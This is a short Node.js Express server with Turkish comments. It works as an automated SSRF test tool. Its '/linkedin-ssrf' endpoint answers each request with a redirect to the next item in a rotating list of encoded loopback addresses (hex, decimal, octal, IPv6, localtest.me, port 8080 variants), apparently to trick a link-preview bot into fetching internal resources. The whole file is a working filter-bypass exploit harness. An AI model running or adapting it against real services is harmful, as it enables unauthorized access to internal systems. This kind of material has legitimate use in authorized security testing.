const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Test etmek istediğimiz tüm bypass ve encode formatlarının listesi
const payloads = [
    'http://0x7f000001/',          // Hexadecimal IP
    'http://2130706433/',          // Decimal IP
    'http://0177.0.0.1/',          // Octal IP
    'http://localtest.me/',        // Loopback Domain (80)
    'http://127.1/',               // Kısa Loopback IP
    'http://[::1]/',               // IPv6 Loopback
    'http://0x7f000001:8080/',     // Hex IP + 8080 Portu
    'http://localtest.me:8080/'    // Loopback Domain + 8080 Portu
];

let currentIndex = 0;

app.get('/linkedin-ssrf', (req, res) => {
    // Sıradaki payload'ı seç
    const target = payloads[currentIndex];
    
    console.log(`----------------------------------------`);
    console.log(`[İstek Yakalandı!] Sıradaki Test Edilen: ${target}`);
    console.log(`[Index: ${currentIndex + 1} / ${payloads.length}] Yönlendiriliyor...`);
    
    // Bir sonraki istek için indeksi bir sonraki elemana taşı (liste bitince baştan başla)
    currentIndex = (currentIndex + 1) % payloads.length;
    
    // Botu sıradaki adrese yönlendir
    res.redirect(302, target);
});

app.listen(PORT, () => {
    console.log(`SSRF Otomatik Test Sunucusu ${PORT} portunda çalışıyor!`);
});
